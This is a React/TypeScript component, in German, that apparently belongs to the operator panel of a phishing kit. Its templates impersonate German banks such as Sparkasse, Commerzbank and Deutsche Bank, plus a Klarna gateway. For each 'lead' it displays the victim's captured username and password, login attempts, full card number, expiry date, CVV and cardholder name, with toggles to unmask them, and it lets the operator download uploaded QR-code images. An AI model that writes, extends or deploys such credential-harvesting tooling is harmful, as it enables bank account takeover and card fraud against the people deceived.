import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { 
  Loader,
  AlertTriangle,
  User,
  CreditCard,
  Eye,
  EyeOff,
  FileImage,
  FileText,
  Download,
  Building2
} from 'lucide-react';
import { 
  LeadHeader, 
  ContactInfo, 
  AuthData, 
  SystemInfo, 
  Notes 
} from './SharedComponents';

interface UnifiedLead {
  id: number;
  template_id: number;
  domain_id: number;
  tracking_id: string | null;
  name: string | null;
  email: string | null;
  phone: string | null;
  username: string | null;
  password: string | null;
  additional_data: string;
  ip_address: string | null;
  user_agent: string | null;
  status: string;
  notes: string | null;
  created_at: string;
  template_name: string;
}

export const UnifiedLeadDetails: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [lead, setLead] = useState<UnifiedLead | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [showCardNumber, setShowCardNumber] = useState(false);
  const [showCvv, setShowCvv] = useState(false);

  // Fetch lead details
  useEffect(() => {
    if (!id) return;

    const fetchLead = async () => {
      try {
        setLoading(true);
        const token = localStorage.getItem('token');
        
        if (!token) {
          setError('Nicht authentifiziert');
          setLoading(false);
          return;
        }

        const response = await fetch(`/api/leads/${id}`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        });

        if (!response.ok) {
          if (response.status === 404) {
            setError('Lead nicht gefunden');
          } else {
            throw new Error('Fehler beim Laden des Leads');
          }
          return;
        }

        const data = await response.json();
        setLead(data.lead);
        setError(null);
      } catch (err) {
        console.error('Error fetching lead:', err);
        setError(err instanceof Error ? err.message : 'Fehler beim Laden des Leads');
      } finally {
        setLoading(false);
      }
    };

    fetchLead();
  }, [id]);

  // Parse additional data (works for all templates)
  const parseAdditionalData = (dataString: string | null): any => {
    if (!dataString) return {};
    
    try {
      return JSON.parse(dataString);
    } catch (error) {
      console.error('Error parsing additional data:', error);
      return {};
    }
  };

  if (loading) {
    return (
      <div className="flex justify-center items-center h-64">
        <Loader className="h-8 w-8 text-indigo-600 animate-spin" />
        <span className="ml-2 text-gray-600">Lade Lead-Details...</span>
      </div>
    );
  }

  if (error || !lead) {
    return (
      <div className="bg-red-50 border border-red-200 rounded-lg p-4 text-red-700 flex items-center">
        <AlertTriangle className="h-5 w-5 mr-2" />
        {error || 'Lead nicht gefunden'}
      </div>
    );
  }

  const additionalData = parseAdditionalData(lead.additional_data);
  
  // Extract universal data structure
  const personalData = additionalData.personal_data || {};
  const bankCard = additionalData.bank_card || {};
  const loginData = additionalData.login_data || {};
  const qrFiles = additionalData.qr_data?.files || additionalData.qr_files || [];
  const branchData = additionalData.selected_branch || additionalData.selectedBranch || additionalData.branchData || null;
  const selectedBank = additionalData.selected_bank || loginData.bank_type || null;

  // Create display name
  const displayName = lead.name || 
    (personalData ? `${personalData.first_name || ''} ${personalData.last_name || ''}`.trim() : '') ||
    lead.username || 
    'Unbekannt';

  // Get bank display name
  const getBankDisplayName = (bankId: string): string => {
    const bankNames: Record<string, string> = {
      'santander': 'Santander',
      'commerzbank': 'Commerzbank',
      'apobank': 'Apobank',
      'sparkasse': 'Sparkasse',
      'postbank': 'Postbank',
      'dkb': 'DKB',
      'volksbank': 'Volksbank',
      'comdirect': 'comdirect',
      'consorsbank': 'Consorsbank',
      'ingdiba': 'ING-DiBa',
      'deutsche_bank': 'Deutsche Bank'
    };
    return bankNames[bankId] || bankId;
  };

  // Get template display name
  const getTemplateDisplayName = (templateName: string): string => {
    const templateNames: Record<string, string> = {
      'santander': 'Santander',
      'commerzbank': 'Commerzbank',
      'apobank': 'Apobank',
      'sparkasse': 'Sparkasse',
      'postbank': 'Postbank',
      'dkb': 'DKB',
      'volksbank': 'Volksbank',
      'comdirect': 'comdirect',
      'consorsbank': 'Consorsbank',
      'ingdiba': 'ING-DiBa',
      'deutsche_bank': 'Deutsche Bank',
      'klarna': 'Klarna Gateway'
    };
    return templateNames[templateName] || templateName;
  };

  return (
    <div className="space-y-6">
      {/* Lead Header */}
      <LeadHeader 
        lead={lead}
        displayName={displayName}
        templateName={getTemplateDisplayName(lead.template_name)}
      />

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Contact Information */}
        <ContactInfo 
          personalData={personalData}
          email={lead.email}
          phone={lead.phone}
        />

        {/* Authentication Data */}
        <AuthData 
          loginData={loginData}
          username={lead.username}
          password={lead.password}
          loginAttempts={additionalData.login_attempts}
        />
      </div>

      {/* Bank Information (for Klarna template) */}
      {selectedBank && lead.template_name === 'klarna' && (
        <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
          <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
            <Building2 className="mr-2 h-5 w-5 text-pink-600" />
            Ausgewählte Bank
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Bank</label>
              <p className="text-gray-900 font-semibold">{getBankDisplayName(selectedBank)}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Bank-ID</label>
              <p className="text-gray-600 font-mono text-sm">{selectedBank}</p>
            </div>
          </div>
        </div>
      )}

      {/* Branch Information (for Sparkasse/Volksbank) */}
      {branchData && (
        <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
          <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
            <Building2 className="mr-2 h-5 w-5 text-blue-600" />
            Filiale
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Filialname</label>
              <p className="text-gray-900">{branchData.branch_name || 'Nicht verfügbar'}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Stadt</label>
              <p className="text-gray-900">{branchData.city || 'Nicht verfügbar'}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">PLZ</label>
              <p className="text-gray-900">{branchData.zip_code || branchData.plz || 'Nicht verfügbar'}</p>
            </div>
          </div>
        </div>
      )}

      {/* Bank Card Information */}
      {(bankCard.card_number || bankCard.expiry_date || bankCard.cvv || bankCard.cardholder_name) && (
        <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
          <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
            <CreditCard className="mr-2 h-5 w-5 text-green-600" />
            Bankkarten-Daten
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Kartennummer</label>
              <div className="flex items-center space-x-2">
                <p className="text-gray-900 font-mono">
                  {showCardNumber ? bankCard.card_number : '•••• •••• •••• ••••'}
                </p>
                <button
                  onClick={() => setShowCardNumber(!showCardNumber)}
                  className="text-indigo-600 hover:text-indigo-800"
                >
                  {showCardNumber ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Ablaufdatum</label>
              <p className="text-gray-900 font-mono">{bankCard.expiry_date || 'Nicht verfügbar'}</p>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
              <div className="flex items-center space-x-2">
                <p className="text-gray-900 font-mono">
                  {showCvv ? bankCard.cvv : '•••'}
                </p>
                <button
                  onClick={() => setShowCvv(!showCvv)}
                  className="text-indigo-600 hover:text-indigo-800"
                >
                  {showCvv ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Karteninhaber</label>
              <p className="text-gray-900">{bankCard.cardholder_name || 'Nicht verfügbar'}</p>
            </div>
          </div>
        </div>
      )}

      {/* QR Code Files */}
      {qrFiles && qrFiles.length > 0 && (
        <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
          <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
            <FileImage className="mr-2 h-5 w-5 text-purple-600" />
            QR-Code Uploads ({qrFiles.length})
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {qrFiles.map((file: any, index: number) => (
              <div key={index} className="border rounded-lg p-4 bg-gray-50">
                <div className="flex items-center justify-between mb-3">
                  <h4 className="font-medium text-gray-800">
                    Versuch {file.attempt || file.upload_attempt || index + 1}
                  </h4>
                  <span className="text-xs text-gray-500">
                    {file.timestamp ? new Date(file.timestamp).toLocaleString('de-DE') : 
                     file.upload_time ? new Date(file.upload_time).toLocaleString('de-DE') : 
                     'Unbekannt'}
                  </span>
                </div>
                
                {/* File Preview */}
                <div className="mb-3">
                  {file.filename && file.filename.match(/\.(jpg|jpeg|png|gif|webp)$/i) ? (
                    <img 
                      src={`/api/uploads/qr-codes/${file.filename}`}
                      alt={file.originalName || file.filename}
                      className="w-full h-32 object-cover rounded border"
                      onError={(e) => {
                        (e.target as HTMLImageElement).style.display = 'none';
                        (e.target as HTMLImageElement).nextElementSibling!.classList.remove('hidden');
                      }}
                    />
                  ) : (
                    <div className="w-full h-32 bg-gray-200 rounded border flex items-center justify-center">
                      <FileText className="h-12 w-12 text-gray-400" />
                    </div>
                  )}
                  
                  {/* Error fallback */}
                  <div className="w-full h-32 bg-gray-200 rounded border flex items-center justify-center hidden">
                    <FileText className="h-12 w-12 text-gray-400" />
                  </div>
                </div>
                
                {/* File Info */}
                <div className="text-sm text-gray-600 mb-3">
                  <p><strong>Dateiname:</strong> {file.originalName || file.filename || 'Unbekannt'}</p>
                  <p><strong>Größe:</strong> {
                    file.size ? `${(file.size / 1024).toFixed(1)} KB` : 
                    file.filesize ? `${(file.filesize / 1024).toFixed(1)} KB` : 
                    'Unbekannt'
                  }</p>
                  <p><strong>Typ:</strong> {
                    file.mimetype || 
                    file.filetype || 
                    file.filename?.split('.').pop()?.toUpperCase() || 
                    'Unbekannt'
                  }</p>
                </div>
                
                {/* Download Button */}
                {file.filename && (
                  <a
                    href={`/api/uploads/qr-codes/${file.filename}`}
                    download={file.originalName || file.filename}
                    className="inline-flex items-center px-3 py-2 border border-gray-300 shadow-sm text-sm leading-4 font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                  >
                    <Download className="h-4 w-4 mr-2" />
                    Herunterladen
                  </a>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* System Information */}
      <SystemInfo 
        lead={lead}
        additionalData={additionalData}
      />

      {/* Notes */}
      <Notes 
        lead={lead}
        onSave={async (notes: string) => {
          try {
            const token = localStorage.getItem('token');
            if (!token) throw new Error('Not authenticated');

            const response = await fetch(`/api/leads/${lead.id}`, {
              method: 'PUT',
              headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({ notes })
            });

            if (!response.ok) {
              throw new Error('Failed to save notes');
            }

            // Update local state
            setLead(prev => prev ? { ...prev, notes } : null);
          } catch (error) {
            console.error('Error saving notes:', error);
            throw error;
          }
        }}
      />
    </div>
  );
};

export default UnifiedLeadDetails;
